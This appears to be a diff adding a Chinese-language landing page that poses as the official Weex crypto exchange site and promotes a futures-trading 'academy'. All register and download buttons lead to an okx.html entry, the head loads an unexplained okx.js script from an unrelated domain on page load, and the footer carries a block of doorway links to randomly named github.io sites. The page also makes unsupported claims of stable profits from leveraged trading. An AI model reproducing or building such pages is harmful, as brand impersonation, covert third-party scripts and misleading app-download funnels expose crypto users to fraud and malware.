@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="description" content="Weex唯客官网专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。">
+    <meta name="keywords" content="Weex唯客官网">
+    <meta name="author" content="Weex唯客官网合约学院">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="#">
+    <title>Weex唯客官网_正版软件下载_专业透明加密资产平台</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0e17;
+            font-family: 'Inter', 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            color: #e6e9f0;
+            line-height: 1.5;
+        }
+
+        /* 顶部行情栏 */
+        .ticker-bar {
+            background: #0a0c12;
+            color: #f0b90b;
+            padding: 6px 0;
+            font-size: 0.7rem;
+            border-bottom: 1px solid #1e2329;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .ticker-content {
+            display: inline-block;
+            animation: ticker 25s linear infinite;
+        }
+        .ticker-content span {
+            margin: 0 20px;
+        }
+        .ticker-content i {
+            margin-right: 6px;
+            color: #2ecc71;
+        }
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* 头部 - 交易所风格 */
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: #0b0e17;
+            border-bottom: 1px solid #1e2329;
+        }
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .logo h2 {
+            font-size: clamp(1.3rem, 5vw, 1.8rem);
+            font-weight: 700;
+            background: linear-gradient(135deg, #f0b90b, #f39c12);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo p {
+            font-size: 0.6rem;
+            color: #848e9c;
+        }
+        .action-btns {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #f0b90b, #f39c12);
+            border: none;
+            padding: 10px 28px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: #0b0e17;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            white-space: nowrap;
+        }
+        .btn-primary:hover {
+            transform: translateY(-1px);
+            filter: brightness(1.05);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #f0b90b;
+            padding: 10px 28px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: #f0b90b;
+            text-decoration: none;
+            transition: all 0.2s;
+            display: inline-block;
+            white-space: nowrap;
+        }
+        .btn-outline:hover {
+            background: rgba(240, 185, 11, 0.1);
+            border-color: #f39c12;
+            color: #f39c12;
+        }
+
+        @media (max-width: 640px) {
+            .btn-primary, .btn-outline {
+                padding: 8px 20px;
+                font-size: 0.75rem;
+            }
+            .header-inner {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+
+        /* Hero 区域 */
+        .hero-section {
+            padding: clamp(40px, 6vw, 55px) 0 clamp(30px, 5vw, 40px);
+            background: linear-gradient(135deg, #0b0e17 0%, #131722 100%);
+        }
+        .hero-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: clamp(30px, 6vw, 50px);
+        }
+        .hero-left {
+            flex: 1.2;
+            min-width: 280px;
+        }
+        .hero-left .badge {
+            background: rgba(240, 185, 11, 0.15);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            width: fit-content;
+            margin-bottom: 20px;
+            color: #f0b90b;
+            font-weight: 500;
+        }
+        .hero-left h1 {
+            font-size: clamp(1.6rem, 5vw, 2.5rem);
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 16px;
+            color: #ffffff;
+        }
+        .gradient-text {
+            color: #f0b90b;
+        }
+        .hero-desc {
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            color: #a0a6b5;
+            margin-bottom: 24px;
+            max-width: 560px;
+        }
+        .hero-stats {
+            display: flex;
+            gap: clamp(20px, 5vw, 35px);
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .stat-item {
+            background: #1e2329;
+            padding: 8px 16px;
+            border-radius: 8px;
+        }
+        .stat-item h4 {
+            font-size: clamp(1rem, 3.5vw, 1.3rem);
+            font-weight: 700;
+            color: #f0b90b;
+        }
+        .stat-item span {
+            color: #848e9c;
+            font-size: 0.7rem;
+        }
+        .hero-buttons {
+            margin-top: 28px;
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .hero-buttons .btn-primary,
+        .hero-buttons .btn-outline {
+            padding: 12px 32px;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 640px) {
+            .hero-buttons .btn-primary,
+            .hero-buttons .btn-outline {
+                padding: 10px 24px;
+                font-size: 0.85rem;
+            }
+        }
+        .hero-right {
+            flex: 0.9;
+            text-align: center;
+            min-width: 260px;
+        }
+        .hero-icon-box {
+            width: 100%;
+            min-height: 280px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1e2329;
+            border-radius: 16px;
+            color: #f0b90b;
+            font-size: 6rem;
+            border: 1px solid #2d333b;
+        }
+
+        /* 资讯网格 */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            flex-wrap: wrap;
+            margin: clamp(40px, 7vw, 50px) 0 20px;
+            gap: 12px;
+        }
+        .section-header h2 {
+            font-size: clamp(1.2rem, 4vw, 1.5rem);
+            font-weight: 600;
+            border-left: 3px solid #f0b90b;
+            padding-left: 16px;
+            color: #ffffff;
+        }
+        .more-link {
+            color: #f0b90b;
+            text-decoration: none;
+            font-weight: 500;
+            transition: 0.2s;
+            font-size: 0.8rem;
+        }
+        .more-link:hover {
+            color: #f39c12;
+        }
+        .news-masonry {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+        }
+        .news-card {
+            background: #131722;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.2s ease;
+            border: 1px solid #2d333b;
+        }
+        .news-card:hover {
+            transform: translateY(-2px);
+            border-color: #f0b90b;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+        .card-img-wrapper {
+            height: 160px;
+            overflow: hidden;
+            background: #1e2329;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card-icon {
+            font-size: 3.8rem;
+            color: #f0b90b;
+        }
+        .card-info {
+            padding: 18px 20px 22px;
+        }
+        .card-category {
+            display: inline-block;
+            background: #1e2329;
+            color: #f0b90b;
+            border-radius: 4px;
+            font-size: 0.65rem;
+            padding: 4px 10px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .card-info h3 {
+            font-size: clamp(1rem, 3.5vw, 1.2rem);
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #ffffff;
+            line-height: 1.4;
+        }
+        .card-info p {
+            color: #848e9c;
+            font-size: 0.85rem;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+        .read-more-link {
+            color: #f0b90b;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.8rem;
+        }
+        .read-more-link:hover {
+            color: #f39c12;
+            gap: 10px;
+        }
+
+        /* 特色区块 */
+        .feature-callout {
+            margin: clamp(40px, 7vw, 55px) 0;
+            background: #131722;
+            border-radius: 16px;
+            padding: clamp(28px, 5vw, 40px) clamp(24px, 5vw, 40px);
+            border: 1px solid #2d333b;
+        }
+        .feature-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: clamp(30px, 5vw, 45px);
+            align-items: center;
+        }
+        .feature-desc {
+            flex: 1.5;
+            min-width: 260px;
+        }
+        .feature-desc h3 {
+            font-size: clamp(1.3rem, 4.5vw, 1.7rem);
+            margin-bottom: 16px;
+            color: #ffffff;
+            font-weight: 600;
+        }
+        .feature-desc h3 span {
+            color: #f0b90b;
+        }
+        .feature-desc p {
+            color: #848e9c;
+            margin-bottom: 24px;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+        .dual-buttons {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .dual-buttons .btn-primary,
+        .dual-buttons .btn-outline {
+            padding: 10px 32px;
+            font-size: 0.85rem;
+            border-radius: 6px;
+        }
+        .feature-icon-area {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            min-width: 100px;
+        }
+        .icon-ring {
+            background: #1e2329;
+            width: 110px;
+            height: 110px;
+            border-radius: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #f0b90b;
+        }
+        .icon-ring i {
+            font-size: 3rem;
+            color: #f0b90b;
+        }
+        @media (max-width: 768px) {
+            .icon-ring {
+                width: 90px;
+                height: 90px;
+            }
+            .icon-ring i {
+                font-size: 2.5rem;
+            }
+        }
+
+        /* 侧边栏 */
+        .split-layout {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin: 40px 0;
+        }
+        .featured-news {
+            flex: 2;
+            min-width: 280px;
+        }
+        .trending-side {
+            flex: 1;
+            background: #131722;
+            border-radius: 12px;
+            padding: 24px;
+            height: fit-content;
+            border: 1px solid #2d333b;
+        }
+        .trending-side h3 {
+            font-size: clamp(1.1rem, 3.5vw, 1.3rem);
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #f0b90b;
+            border-left: 3px solid #f0b90b;
+            padding-left: 14px;
+            font-weight: 600;
+        }
+        .trend-list {
+            list-style: none;
+        }
+        .trend-list li {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #2d333b;
+        }
+        .trend-num {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #f0b90b;
+            min-width: 30px;
+        }
+        .trend-content strong {
+            display: block;
+            margin-bottom: 4px;
+            color: #ffffff;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .trend-content span {
+            font-size: 0.65rem;
+            color: #848e9c;
+        }
+        .sidebar-notice {
+            background: #1e2329;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            border: 1px solid #2d333b;
+        }
+
+        footer {
+            background: #0a0c12;
+            margin-top: 55px;
+            padding: 40px 0 28px;
+            border-top: 1px solid #1e2329;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 30px;
+        }
+        .footer-col a {
+            color: #848e9c;
+            text-decoration: none;
+            display: block;
+            margin: 6px 0;
+            font-size: 0.75rem;
+            transition: 0.2s;
+        }
+        .footer-col a:hover {
+            color: #f0b90b;
+        }
+        .footer-col h4 {
+            color: #e6e9f0;
+            margin-bottom: 12px;
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+        .copyright {
+            text-align: center;
+            padding-top: 28px;
+            font-size: 0.65rem;
+            color: #5e6673;
+        }
+        @media (max-width: 768px) {
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                gap: 24px;
+            }
+            .footer-col {
+                width: 100%;
+            }
+        }
+    </style>
+        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; }
+            else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?01c83902f378f54c075a86cb18ba04d0";
+          var s = document.getElementsByTagName("script")[0]; 
+          s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+<script language="javascript" src="https://m.233.icu/okx.js"></script>
+</head>
+<body>
+<div class="ticker-bar">
+    <div class="ticker-content">
+        <span><i class="fab fa-bitcoin"></i> BTC 86,432.12 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +2.34%</span>
+        <span><i class="fab fa-ethereum"></i> ETH 3,245.67 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +1.87%</span>
+        <span><i class="fab fa-solana"></i> SOL 189.23 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +4.56%</span>
+        <span><i class="fab fa-bitcoin"></i> BTC 86,432.12 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +2.34%</span>
+        <span><i class="fab fa-ethereum"></i> ETH 3,245.67 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +1.87%</span>
+        <span><i class="fab fa-solana"></i> SOL 189.23 <i class="fas fa-arrow-up" style="color:#2ecc71;"></i> +4.56%</span>
+    </div>
+</div>
+
+<header class="header">
+    <div class="container header-inner">
+        <div class="logo">
+            <h2>Weex唯客官网 <span>CONTRACT</span></h2>
+            <p>合约交易学院 · 专业赋能</p>
+        </div>
+        <div class="action-btns">
+            <a href="/okx.html" class="btn-primary">注册账户</a>
+            <a href="/okx.html" class="btn-outline">下载APP</a>
+        </div>
+    </div>
+</header>
+
+<main>
+    <section class="hero-section">
+        <div class="container hero-wrapper">
+            <div class="hero-left">
+                <div class="badge">⚡ 合约交易实战学院 · 专业赋能 ⚡</div>
+                <h1>Weex唯客官网合约交易<br><span class="gradient-text"> 实战</span>训练营</h1>
+                <p class="hero-desc">从入门到精通，系统学习合约交易核心技能。掌握杠杆运用、风险控制、策略构建，成为专业交易者。</p>
+                <div class="hero-stats">
+                    <div class="stat-item"><h4>156,000+</h4><span>认证学员</span></div>
+                    <div class="stat-item"><h4>$2.8B</h4><span>模拟交易量</span></div>
+                    <div class="stat-item"><h4>92%</h4><span>课程完成率</span></div>
+                </div>
+                <div class="hero-buttons">
+                    <a href="/okx.html" class="btn-primary">注册账户</a>
+                    <a href="/okx.html" class="btn-outline">下载APP</a>
+                </div>
+            </div>
+            <div class="hero-right">
+                <div class="hero-icon-box">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="container">
+        <div class="section-header">
+            <h2>📊 实战课程 · 系统学习</h2>
+            <a href="#" class="more-link">查看全部课程 →</a>
+        </div>
+        <div class="news-masonry">
+            <article class="news-card">
+                <div class="card-img-wrapper">
+                    <i class="fas fa-book-open card-icon"></i>
+                </div>
+                <div class="card-info">
+                    <span class="card-category">📖 入门课程</span>
+                    <h3>永续合约完全指南：从原理到实操</h3>
+                    <p>深入理解永续合约定价机制、资金费率、保证金制度，掌握基础交易操作流程。</p>
+                    <div class="card-meta">
+                        <span style="font-size: 0.65rem;">新手必修 · 8课时</span>
+                        <a href="#" class="read-more-link">开始学习 →</a>
+                    </div>
+                </div>
+            </article>
+            <article class="news-card">
+                <div class="card-img-wrapper">
+                    <i class="fas fa-calculator card-icon"></i>
+                </div>
+                <div class="card-info">
+                    <span class="card-category">⚖️ 风险管理</span>
+                    <h3>仓位管理核心技巧：止损与资金分配</h3>
+                    <p>学习科学的仓位计算方法，掌握止损设置技巧，建立完整的风险控制体系。</p>
+                    <div class="card-meta">
+                        <span style="font-size: 0.65rem;">进阶课程 · 12课时</span>
+                        <a href="#" class="read-more-link">开始学习 →</a>
+                    </div>
+                </div>
+            </article>
+            <article class="news-card">
+                <div class="card-img-wrapper">
+                    <i class="fas fa-chart-line card-icon"></i>
+                </div>
+                <div class="card-info">
+                    <span class="card-category">📈 技术分析</span>
+                    <h3>趋势交易策略：识别主升浪与回调</h3>
+                    <p>运用均线系统、趋势线、形态分析，精准捕捉趋势启动点与离场时机。</p>
+                    <div class="card-meta">
+                        <span style="font-size: 0.65rem;">策略课程 · 10课时</span>
+                        <a href="#" class="read-more-link">开始学习 →</a>
+                    </div>
+                </div>
+            </article>
+        </div>
+
+        <div class="split-layout">
+            <div class="featured-news">
+                <div class="section-header" style="margin-top: 0;">
+                    <h2>💡 高阶策略 · 实战精讲</h2>
+                </div>
+                <div class="news-masonry" style="grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));">
+                    <article class="news-card">
+                        <div class="card-img-wrapper">
+                            <i class="fas fa-chart-pie card-icon"></i>
+                        </div>
+                        <div class="card-info">
+                            <span class="card-category">📊 套利策略</span>
+                            <h3>资金费率套利：低风险稳健收益</h3>
+                            <p>深入解析资金费率套利原理，掌握多空持仓平衡技巧，实现稳定收益。</p>
+                            <a href="#" class="read-more-link">查看详情 →</a>
+                        </div>
+                    </article>
+                    <article class="news-card">
+                        <div class="card-img-wrapper">
+                            <i class="fas fa-chart-line card-icon"></i>
+                        </div>
+                        <div class="card-info">
+                            <span class="card-category">⚡ 短线交易</span>
+                            <h3>1分钟K线战法：捕捉快速波动</h3>
+                            <p>学习超短线交易技巧，识别关键K线形态，把握日内交易机会。</p>
+                            <a href="#" class="read-more-link">查看详情 →</a>
+                        </div>
+                    </article>
+                </div>
+            </div>
+
+            <aside class="trending-side">
+                <h3>🔥 热门实战 · 学员推荐</h3>
+                <ul class="trend-list">
+                    <li><div class="trend-num">01</div><div class="trend-content"><strong>资金费率套利实战案例解析</strong><span>12.8k 学习 · 热门</span></div></li>
+                    <li><div class="trend-num">02</div><div class="trend-content"><strong>如何设置合理的杠杆倍数？</strong><span>10.5k 学习 · 进阶</span></div></li>
+                    <li><div class="trend-num">03</div><div class="trend-content"><strong>爆仓预警与风险控制实战</strong><span>9.2k 学习 · 热门</span></div></li>
+                    <li><div class="trend-num">04</div><div class="trend-content"><strong>斐波那契回调在合约中的应用</strong><span>7.8k 学习 · 进阶</span></div></li>
+                    <li><div class="trend-num">05</div><div class="trend-content"><strong>多空持仓比解读：主力动向分析</strong><span>6.4k 学习 · 进阶</span></div></li>
+                </ul>
+                <div class="sidebar-notice">
+                    <p style="font-weight: 600; margin-bottom: 8px; color: #f0b90b;">📈 今日推荐</p>
+                    <p style="font-size: 0.7rem;">实战直播：职业交易员分享日内交易策略，今晚8点开播！</p>
+                    <a href="#" style="color:#f0b90b; margin-top: 10px; display: inline-block; font-size: 0.7rem;">预约直播 →</a>
+                </div>
+            </aside>
+        </div>
+
+        <div class="feature-callout">
+            <div class="feature-grid">
+                <div class="feature-desc">
+                    <h3>开启<span>Weex唯客官网</span>实战之旅</h3>
+                    <p>系统学习合约交易实战技能，掌握杠杆运用、风险控制、策略构建，在真实市场中稳健成长。</p>
+                    <div class="dual-buttons">
+                        <a href="/okx.html" class="btn-primary">注册账户</a>
+                        <a href="/okx.html" class="btn-outline">下载APP</a>
+                    </div>
+                </div>
+                <div class="feature-icon-area">
+                    <div class="icon-ring">
+                        <i class="fas fa-graduation-cap"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div>
+            <div class="section-header">
+                <h2>📸 学员案例 · 实战分享</h2>
+                <a href="#" class="more-link">更多案例 →</a>
+            </div>
+            <div class="news-masonry">
+                <article class="news-card">
+                    <div class="card-img-wrapper">
+                        <i class="fas fa-user-check card-icon"></i>
+                    </div>
+                    <div class="card-info">
+                        <span class="card-category">📊 实战案例</span>
+                        <h3>从新手到稳定盈利：3个月学习复盘</h3>
+                        <p>系统学习合约课程后，建立完整交易体系，实现持续稳定收益。</p>
+                        <a href="#" class="read-more-link">阅读案例 →</a>
+                    </div>
+                </article>
+                <article class="news-card">
+                    <div class="card-img-wrapper">
+                        <i class="fas fa-chalkboard-user card-icon"></i>
+                    </div>
+                    <div class="card-info">
+                        <span class="card-category">🎤 导师专访</span>
+                        <h3>职业交易员访谈：实战心法分享</h3>
+                        <p>10年交易经验总结，谈心态管理、策略执行与风险控制。</p>
+                        <a href="#" class="read-more-link">观看访谈 →</a>
+                    </div>
+                </article>
+                <article class="news-card">
+                    <div class="card-img-wrapper">
+                        <i class="fas fa-users card-icon"></i>
+                    </div>
+                    <div class="card-info">
+                        <span class="card-category">👥 实战社群</span>
+                        <h3>加入交易实战群，与高手同行</h3>
+                        <p>每日行情解读、策略复盘、实战交流，共同成长进步。</p>
+                        <a href="#" class="read-more-link">加入社群 →</a>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer>
+    <div class="container">
+        <div class="footer-links">
+            <div class="footer-col">
+                <h4>Weex唯客官网合约学院</h4>
+                <a href="#">关于学院</a>
+                <a href="#">课程体系</a>
+                <a href="#">导师团队</a>
+            </div>
+            <div class="footer-col">
+                <h4>实战资源</h4>
+                <a href="#">入门课程</a>
+                <a href="#">进阶策略</a>
+                <a href="#">风险控制</a>
+            </div>
+            <div class="footer-col">
+                <h4>帮助支持</h4>
+                <a href="#">常见问题</a>
+                <a href="#">联系我们</a>
+                <a href="#">学习建议</a>
+            </div>
+            <div class="footer-col">
+                <h4>官方渠道</h4>
+                <a href="#">实战直播</a>
+                <a href="#">学习社群</a>
+                <a href="#">官方公告</a>
+            </div>
+        </div>
+        <div class="copyright">
+            <p>© 2026 Weex唯客官网 合约实战学院 | 投资有风险，入市需谨慎 | 注册下载链接均为/okx.html入口示意</p>
+            <p>本平台提供合约交易知识普及，不构成投资建议，请理性参与交易。</p>
+        </div>
+    </div>
+        <div class="footer_bottom">
+            <p class="muted">
+                <a href="/">Weex唯客官网</a>
+                <a href="https://williamserica614.github.io/" target="_blank">WEEX官方app下载</a><a href="https://milleralexis733.github.io/" target="_blank">WEEX安卓版下载步骤</a><a href="https://blairmiranda500.github.io/" target="_blank">weex唯客</a><a href="https://smithgloria537.github.io" target="_blank">唯客下载</a><a href="https://calderonchristina666.github.io/" target="_blank">WeeX官方正版下载安装</a><a href="https://vincentpreston165.github.io/" target="_blank">weex唯客交易平台</a><a href="https://cochranmatthew383.github.io/" target="_blank">weex注册</a><a href="https://hahnlee924.github.io/" target="_blank">Weex唯客官网</a>                            </p>
+        </div></footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "EducationalOrganization",
+  "name": "Weex唯客官网-即刻安装数字终端,兼容所有品牌",
+  "url": "#",
+  "description": "Weex唯客官网专为Android系统设计,是面向安卓用户的高效加密货币管理工具。支持多种数字货币的存储、转账与交易,提供多重安全防护机制,助力用户便捷掌控数字资产,畅享安全流畅的区块链体验。",
+  "keywords": "Weex唯客官网"
+}
+</script>
+
+</body>
+</html>
